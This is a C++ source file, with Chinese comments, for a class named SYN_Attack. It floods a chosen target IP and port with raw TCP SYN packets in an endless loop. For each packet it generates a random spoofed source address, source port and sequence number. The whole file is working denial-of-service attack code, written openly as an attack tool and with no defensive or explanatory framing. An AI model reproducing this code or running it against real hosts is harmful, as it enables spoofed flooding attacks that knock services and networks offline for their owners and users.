#include "syn_attack.h"

#include <netinet/tcp.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>

#define EXTRA_PAYLOAD (8)

struct pseudohdr {  // 伪首部
    unsigned int saddr;
    unsigned int daddr;
    char zero;
    char protocol;
    unsigned short length;
};

/**
 * @brief 攻击指定目标
 *
 * @param dest 目标IP
 * @param port 目标端口
 */
void SYN_Attack::start(char *dest, int port) {
    this->start(inet_addr(dest), port);
}

/**
 * @brief 攻击指定目标
 *
 * @param dest 目标IP
 * @param port 目标端口
 */
void SYN_Attack::start(in_addr_t dest, int port) {
    if (port < 0 || port > 65535) {
        printf("Port Error\n");
        exit(1);
    }

    // 不使用广播方式发送数据包
    this->ip_pack.setBroadcastState(false);

    // 设置目标信息
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = dest;

    // 伪首部
    struct pseudohdr *pseudoheader = (pseudohdr *)malloc(
        sizeof(struct pseudohdr) + sizeof(struct tcphdr) + EXTRA_PAYLOAD);

    // TCP首部
    struct tcphdr *tcp_pack =
        (tcphdr *)(((uint8_t *)pseudoheader) + sizeof(struct pseudohdr));
    memset(tcp_pack, 0, sizeof(struct tcphdr));

    tcp_pack->th_sport = htons(rand() % 16383 + 49152);  // 随机生成源端口
    tcp_pack->th_dport = htons(port);                    // 目的端口
    tcp_pack->th_seq = htonl(rand() % 90000000 + 2345);  // 随机生成序号
    tcp_pack->th_ack = 0;                                // 确认号
    tcp_pack->th_off = (sizeof(struct tcphdr) / 4);      // 数据偏移
    tcp_pack->th_flags = TH_SYN;                         // SYN
    tcp_pack->th_win = htons(2048);                      // 窗口
    tcp_pack->th_sum = 0;                                // 校验和
    tcp_pack->th_urp = 0;

    pseudoheader->saddr = rand();  // 随机生成源地址
    pseudoheader->daddr = dest;    // 目的地址
    pseudoheader->zero = 0;
    pseudoheader->protocol = IPPROTO_TCP;  // 使用TCP协议
    pseudoheader->length =
        htons(sizeof(struct tcphdr) + EXTRA_PAYLOAD);  // 数据长度

    while (true) {
        tcp_pack->th_sum = 0;
        tcp_pack->th_sum = IP_PACK::checksum(
            (u_short *)pseudoheader,
            sizeof(struct pseudohdr) + sizeof(struct tcphdr));  // 计算tcp校验位

        ip_pack.sendPack(tcp_pack, sizeof(struct tcphdr) + EXTRA_PAYLOAD,
                         pseudoheader->saddr, addr);

        // 重新随机生成数据
        pseudoheader->saddr = rand();
        tcp_pack->th_sport = htons(rand() % 16383 + 49152);
        tcp_pack->th_seq = htonl(rand() % 90000000 + 2345);
    }

    free(pseudoheader);
}